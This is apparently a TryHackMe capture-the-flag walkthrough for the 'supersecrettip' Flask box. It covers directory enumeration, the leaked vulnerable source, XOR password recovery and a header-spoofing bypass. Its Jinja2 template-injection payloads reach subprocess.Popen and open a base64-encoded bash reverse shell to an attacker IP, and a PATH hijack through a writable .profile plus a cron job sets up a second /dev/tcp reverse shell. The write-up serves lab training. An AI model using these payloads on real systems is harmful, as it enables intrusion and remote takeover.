<code>

https://tryhackme.com/room/supersecrettip


```nmap  -sV -A -Pn 10.10.150.162   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-27 12:40 CEST
Nmap scan report for 10.10.150.162
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:b8:18:ef:45:a8:df:59:bf:11:49:4b:1d:b6:b8:93 (RSA)
|   256 0b:cf:f9:94:06:85:97:f6:bd:cc:33:66:4e:26:ea:27 (ECDSA)
|_  256 60:ce:be:2d:1e:f0:18:00:30:70:ff:a2:66:d7:85:f7 (ED25519)
7777/tcp open  cbt?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
```




```                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.150.162:7777 -x .php, .txt, .html 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.150.162:7777
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cloud                (Status: 200) [Size: 2991]
/debug                (Status: 200) [Size: 1957]
```

                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.67.247:7777/cloud -x .php, .txt
nothing

## FFUZ

```
POST http://10.10.247.188:7777/cloud HTTP/1.1
host: 10.10.247.188:7777
user-agent: Mozilla/5.0 (Windows NT 10.0; rv:125.0) Gecko/20100101 Firefox/125.0
pragma: no-cache
cache-control: no-cache
content-type: application/x-www-form-urlencoded
referer: http://10.10.247.188:7777/cloud
content-length: 21

download=FFUZ
```


**Get Source.py file**

```
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"]) 
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")

@app.route("/debug", methods=["GET"]) 
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    
    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    
    
    session['debug'] = debug
    session['password'] = encrypted_pass
        
    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"]) 
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    # return render_template("debugresult.html", debug=debug, success=True)
    
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")

@app.route("/", methods=["GET"])
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777, debug=False)
```

**Main from source.py**

There is a file called ‘**supersecrettip.txt**’ in the same directory that we can download it.
This file import two other non-standard python file called **ip.py(using in /debugresult) and debugpassword.py** .
When using debugger, the “‘&;%” is the illegal character.
In the /cloud directory, there is only two kind of file can be downloaded, the first one is called “source.py”, another one is the file with “.txt” extension.
There is another directory called **/debugresult** . It seems use to get the feedback of the /debug page.

```
┌──(kali㉿kali)-[~/Documents/THM/THM_SuperSecretTip]
└─$ ls
debugpassword.py  ip.py  source.py  supersecrettip.txt
                                                                                                                               
┌──(kali㉿kali)-[~/Documents/THM/THM_SuperSecretTip]
└─$ cat debugpassword.py 
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
                                                                                                                               
┌──(kali㉿kali)-[~/Documents/THM/THM_SuperSecretTip]
└─$ cat ip.py           
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
                                                                                                                               
┌──(kali㉿kali)-[~/Documents/THM/THM_SuperSecretTip]
└─$ cat supersecrettip.txt 
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'


┌──(kali㉿kali)-[~/Documents/THM/THM_SuperSecretTip]
└─$ python3                                                
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'.hex()
'2000000000251c0d0318061e'
```

Set manualy X-Forwarded-For: 127.0.0.1 to reguest

Use CyberChef for xor to get **AyhamDeebugg** from 2000000000251c0d0318061e


{{"".__class__.__mro__[1].__subclasses__()}}

We are able to retrieve all classes used in the application and find the class **subprocess.Popen** like in the article. It is located at index 415. Found by a simple python program, we wrote iterating through the returned array. It differs from case to case.

So, we are able to call subprocess.Popen with the following payload:

{{"".__class__.__mro__[1].__subclasses__()[415]}} 


{{"".__class__.__mro__[1].__subclasses__()[415]("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjI4LjEwOC85MDAxIDA+JjE= | base64 -d | bash",shell=True,stdout=-1).communicate()}}
{{"".__class__.__mro__[1].__subclasses__()[416]("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjI4LjEwOC85MDAxIDA+JjEK | base64 -d | bash",shell=True,stdout=-1).communicate()}}

**Get reverse shell as user Ayham**

run linpeas and found

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
*  *    * * *   root    curl -K /home/F30s/site_check
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```
**Privilage Escalation to F30s**

While enumerating, we find a writable .profile file in F30s home directory. 

We are able to manipulate his PATH variable which is helpful, because the cronjob for F30s is running bash with the tag -l which means it act as if it had been invoked as a login shell referring the PATH variable.

```           
ayham@482cbf2305ae:/home/F30s$ echo 'PATH="/home/ayham/bin/:$PATH"' > .profile
ayham@482cbf2305ae:/home/F30s$ cat .profile
cat .profile
PATH="/home/ayham/bin/:$PATH"
ayham@482cbf2305ae:~/bin$ echo '#!/bin/bash' > cat
echo '#!/bin/bash' > cat
ayham@482cbf2305ae:~/bin$ echo 'bash -i >& /dev/tcp/10.8.28.108/4445 0>&1' >> cat
< 'bash -i >& /dev/tcp/10.8.28.108/4445 0>&1' >> cat
ayham@482cbf2305ae:~/bin$ more cat
more cat
#!/bin/bash
bash -i >& /dev/tcp/10.8.28.108/4445 0>&1
```


